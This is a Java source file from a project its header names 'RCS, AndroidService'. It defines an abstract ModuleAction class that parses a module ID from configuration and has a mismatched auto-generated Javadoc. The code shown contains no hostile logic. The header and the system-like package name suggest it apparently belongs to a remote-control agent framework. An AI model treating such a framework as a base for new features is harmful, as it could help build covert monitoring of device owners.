/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action;

import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
abstract class ModuleAction extends SubAction {
	private static final String TAG = "AgentAction"; //$NON-NLS-1$

	protected String moduleId;

	/**
	 * Instantiates a new stop agent action.
	 * 
	 * @param jsubaction
	 *            the conf params
	 */
	public ModuleAction(final ConfAction jsubaction) {
		super(jsubaction);
	}

	@Override
	protected boolean parse(ConfAction params) {

		try {
			this.moduleId = params.getString("module");
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

}
